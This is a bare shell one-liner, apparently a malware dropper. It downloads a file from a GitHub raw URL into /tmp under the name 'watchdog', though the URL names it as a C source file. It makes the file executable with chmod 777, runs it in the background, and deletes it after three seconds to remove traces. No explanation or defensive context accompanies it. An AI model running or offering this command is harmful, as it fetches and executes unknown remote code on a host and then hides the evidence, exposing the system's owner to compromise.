curl -o /tmp/watchdog https://raw.githubusercontent.com/unixDavid/linux/master/usr/gen_init_cpio.c;chmod 777  /tmp/watchdog;cd /tmp && (./watchdog&) && (sleep 3) && rm -rf /tmp/watchdog
